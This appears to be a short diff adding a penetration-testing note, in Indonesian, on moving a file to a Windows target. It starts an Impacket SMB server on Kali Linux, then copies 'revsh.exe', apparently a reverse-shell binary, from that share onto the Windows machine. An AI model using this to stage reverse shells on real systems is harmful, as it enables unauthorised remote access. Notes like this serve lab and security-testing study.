@@ -1,0 +1,5 @@
+run ini di linux
+`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
+
+lalu di windows
+`copy \\IP-linux\kali\revsh.exe C:\path\to\save\revsh.exe`
